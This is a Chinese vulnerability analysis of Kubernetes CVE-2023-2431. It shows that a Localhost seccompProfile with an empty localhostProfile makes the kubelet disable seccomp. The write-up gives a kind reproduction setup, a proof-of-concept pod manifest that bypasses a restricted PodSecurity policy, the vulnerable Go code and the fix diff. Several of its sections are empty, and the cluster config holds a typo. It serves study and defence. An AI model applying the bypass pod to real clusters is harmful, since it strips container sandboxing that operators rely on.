# 漏洞分析

## 一、漏洞基本信息

| Item                        | Details                                          | Note                                        |
|-----------------------------|--------------------------------------------------|---------------------------------------------|
| Project                     | Kubernetes                                       |                                             |
| CVE-ID                      | CVE-2023-2431                                    |                                             |
| Vuln's Author               | Tim Allclair                                     | [twitter](https://twitter.com/tallclair)    |
| CVSS                        | 3.4 CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N |                                             |
| Exploits                    |                                                  |                                             |
| Affect Version              | <= v1.24.13                                      |                                             |
| Fix Version                 | v1.27.2, v1.26.5, v1.25.10, V1.24.14             |                                             |
| Original Report             |                                                  |                                             |
| Fix Commit                  | [commit](https://github.com/kubernetes/kubernetes/commit/3d3686b9cf0c85f23898aa828b9a19f52b76324f)  |   |
| Introduce Commit            | [commit](https://github.com/kubernetes/kubernetes/commit/8976e3620f8963e72084971d9d4decbd026bf49f)  |   |
| Publish Date                | 2023-06-15                                       |                                             |
| Introduce Date              | 2020-07-06                                       |                                             |


## 二、组件简介
kubelet为kubernetes重要组件，运行在每一个节点上，负责保证容器在pod中正确运行，主要功能包括pod生命周期管理、健康检查、资源使用监控等功能

## 三、漏洞详情

### 1. 介绍
在1.19版本中，k8s开始支持配置seccomp规则，即可以使用内置规则（RuntimeDefault），也可以使用本地配置文件。当PodSecurity设置为restricted时，会强制创建Pod时要明确指定seccompProfile以加载seccomp配置，但当使用本地配置时，设置localhostProfile为空字符串则可实现不启用seccomp

### 2. 影响
对于集群强制使用seccomp的场景，可以通过在创建Pod时指定localhostProfile为空字符串进行绕过，实现禁用seccomp

## 四、防御
更新到修复版本

## 五、漏洞复现

### 1. 复现环境
- 创建kind配置文件`kind-config.yaml`，启用PodSecurity
```yaml
ind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
kubeadmConfigPatches:
- |
  apiVersion: kubeadm.k8s.io/v1beta2
  kind: ClusterConfiguration
  metadata:
    name: config
  apiServer:
    extraArgs:
      enable-admission-plugins: NodeRestriction,PodSecurity
nodes:
- role: control-plane
```
- 创建包含漏洞版本的集群
```shell
kind create cluster --name cve-2023-2431 --image=kindest/node:v1.23.13 --config=kind-config.yaml
```

### 2. 复现过程

- 设置default命名空间的PodSecurity规则为restricted
```shell
kubectl label --overwrite ns default pod-security.kubernetes.io/enforce=restricted
```
- 在default命名空间下创建pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: my-nginx
  labels:
    app: my-app
spec:
  containers:
    - name: my-nginx
      image: nginxinc/nginx-unprivileged
      ports:
        - containerPort: 8080
      securityContext:
        allowPrivilegeEscalation: false
        capabilities:
          drop: ['ALL']
        runAsNonRoot: true
        seccompProfile:
          type: RuntimeDefault 
```
- 测试seccomp是否启用
```shell
kubectl exec my-nginx -- cat /proc/1/status | grep Seccomp
```
- 创建利用Pod，绕过seccomp限制
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: poc-pod
  labels:
    app: my-app
spec:
  containers:
    - name: poc-pod
      image: nginxinc/nginx-unprivileged
      ports:
        - containerPort: 8080
      securityContext:
        allowPrivilegeEscalation: false
        capabilities:
          drop: ['ALL']
        runAsNonRoot: true
        seccompProfile:
          type: Localhost
          localhostProfile: ""
```
- 测试seccomp是否已禁用
```
kubectl exec poc-pod -- cat /proc/1/status | grep Seccomp
```

## 六、漏洞分析

### 1. 原始特性分析

`localhostProfile`原来的目的是给用户自己配置本地seccomp的能力，使得seccomp使用更加灵活

### 2. 调用链分析

1. pkg/kubelet/kuberuntime/kuberuntime_container.go:startContainer
2. pkg/kubelet/kuberuntime/kuberuntime_container.go:generateContainerConfig
3. pkg/kubelet/kuberuntime/kuberuntime_container_linux.go:applyPlatformSpecificContainerConfig
4. pkg/kubelet/kuberuntime/kuberuntime_container_linux.go:generateLinuxContainerConfig
5. pkg/kubelet/kuberuntime/security_context.go:determineEffectiveSecurityContext
6. pkg/kubelet/kuberuntime/helpers.go:getSeccompProfile
7. pkg/kubelet/kuberuntime/helpers.go:fieldSeccompProfile

### 3. 漏洞分析

函数`fieldSeccompProfile`在设置了类型为Localhost的seccompProfile时，会去检查localhostProfile的长度，只有在非空字符串的情形下才生效，如果其长度为0则会返回`runtimeapi.SecurityProfile_Unconfined`禁用Seccomp

pkg/kubelet/kuberuntime/helpers.go:fieldSeccompProfile
```go
func fieldSeccompProfile(scmp *v1.SeccompProfile, profileRootPath string) *runtimeapi.SecurityProfile {
	// TODO: Move to RuntimeDefault as the default instead of Unconfined after discussion
	// with sig-node.
	if scmp == nil {
		return &runtimeapi.SecurityProfile{
			ProfileType: runtimeapi.SecurityProfile_Unconfined,
		}
	}
	if scmp.Type == v1.SeccompProfileTypeRuntimeDefault {
		return &runtimeapi.SecurityProfile{
			ProfileType: runtimeapi.SecurityProfile_RuntimeDefault,
		}
	}
	if scmp.Type == v1.SeccompProfileTypeLocalhost && scmp.LocalhostProfile != nil && len(*scmp.LocalhostProfile) > 0 {
		fname := filepath.Join(profileRootPath, *scmp.LocalhostProfile)
		return &runtimeapi.SecurityProfile{
			ProfileType:  runtimeapi.SecurityProfile_Localhost,
			LocalhostRef: fname,
		}
	}
	return &runtimeapi.SecurityProfile{
		ProfileType: runtimeapi.SecurityProfile_Unconfined,
	}
}
```

## 七、漏洞修复分析

增加了错误处理，在设置Localhost类型的seccompProfile且localhostProfile为空字符串时，返回错误
```patch
-func fieldSeccompProfile(scmp *v1.SeccompProfile, profileRootPath string, fallbackToRuntimeDefault bool) *runtimeapi.SecurityProfile {
+func fieldSeccompProfile(scmp *v1.SeccompProfile, profileRootPath string, fallbackToRuntimeDefault bool) (*runtimeapi.SecurityProfile, error) {
 	if scmp == nil {
 		if fallbackToRuntimeDefault {
 			return &runtimeapi.SecurityProfile{
 				ProfileType: runtimeapi.SecurityProfile_RuntimeDefault,
-			}
+			}, nil
 		}
 		return &runtimeapi.SecurityProfile{
 			ProfileType: runtimeapi.SecurityProfile_Unconfined,
-		}
+		}, nil
 	}
 	if scmp.Type == v1.SeccompProfileTypeRuntimeDefault {
 		return &runtimeapi.SecurityProfile{
 			ProfileType: runtimeapi.SecurityProfile_RuntimeDefault,
-		}
+		}, nil
 	}
-	if scmp.Type == v1.SeccompProfileTypeLocalhost && scmp.LocalhostProfile != nil && len(*scmp.LocalhostProfile) > 0 {
-		fname := filepath.Join(profileRootPath, *scmp.LocalhostProfile)
-		return &runtimeapi.SecurityProfile{
-			ProfileType:  runtimeapi.SecurityProfile_Localhost,
-			LocalhostRef: fname,
+	if scmp.Type == v1.SeccompProfileTypeLocalhost {
+		if scmp.LocalhostProfile != nil && len(*scmp.LocalhostProfile) > 0 {
+			fname := filepath.Join(profileRootPath, *scmp.LocalhostProfile)
+			return &runtimeapi.SecurityProfile{
+				ProfileType:  runtimeapi.SecurityProfile_Localhost,
+				LocalhostRef: fname,
+			}, nil
+		} else {
+			return nil, fmt.Errorf("localhostProfile must be set if seccompProfile type is Localhost.")
 		}
 	}
 	return &runtimeapi.SecurityProfile{
 		ProfileType: runtimeapi.SecurityProfile_Unconfined,
-	}
+	}, nil
 }

--- a/pkg/kubelet/kuberuntime/security_context.go
+++ b/pkg/kubelet/kuberuntime/security_context.go
@@ -37,9 +37,16 @@ func (m *kubeGenericRuntimeManager) determineEffectiveSecurityContext(pod *v1.Po
 
 	// TODO: Deprecated, remove after we switch to Seccomp field
 	// set SeccompProfilePath.
-	synthesized.SeccompProfilePath = m.getSeccompProfilePath(pod.Annotations, container.Name, pod.Spec.SecurityContext, container.SecurityContext, m.seccompDefault)
+	var err error
+	synthesized.SeccompProfilePath, err = m.getSeccompProfilePath(pod.Annotations, container.Name, pod.Spec.SecurityContext, container.SecurityContext, m.seccompDefault)
+	if err != nil {
+		return nil, err
+	}
 
-	synthesized.Seccomp = m.getSeccompProfile(pod.Annotations, container.Name, pod.Spec.SecurityContext, container.SecurityContext, m.seccompDefault)
+	synthesized.Seccomp, err = m.getSeccompProfile(pod.Annotations, container.Name, pod.Spec.SecurityContext, container.SecurityContext, m.seccompDefault)
+	if err != nil {
+		return nil, err
+	}
 
 	// set ApparmorProfile.
 	synthesized.ApparmorProfile = apparmor.GetProfileNameFromPodAnnotations(pod.Annotations, container.Name)
```

## 八、漏洞挖掘方法与过程

## 九、同类问题挖掘方法

### 设计实现层

### Fuzz

### codeql

## 十、时间线

